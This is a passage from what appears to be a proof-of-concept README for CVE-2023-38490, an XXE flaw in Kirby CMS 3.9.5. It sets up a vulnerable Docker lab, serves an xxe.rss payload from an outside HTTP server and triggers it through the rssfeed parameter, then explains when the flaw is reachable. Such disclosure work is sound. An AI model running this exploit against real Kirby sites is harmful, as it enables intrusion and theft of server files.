cd docker
docker buildx build -t kirby-starterkit-3.9.5 .
docker run -d --rm -p 127.0.0.2:1337:80/tcp --name CVE-2023-38490 kirby-starterkit-3.9.5:latest

Note: choose a bind address that the docker container can access.

```bash
popd
ruby -run -e httpd ./payload -p 9999 -b 192.168.0.225
```

Trigger the exploit:

```bash
xdg-open http://127.0.0.2:1337/rssfeed?feed=http://192.168.0.225:9999/xxe.rss
```

## How, and why does it work?

The vulnerable function is present in Kirby Core but is not used by default in Kirby Core, Kirby StarterKit, or Kirby PlainKit. It means the vulnerability won't affect you on default configuration but could be introduced with custom development or by installing a plugin using the impacted toolkit.
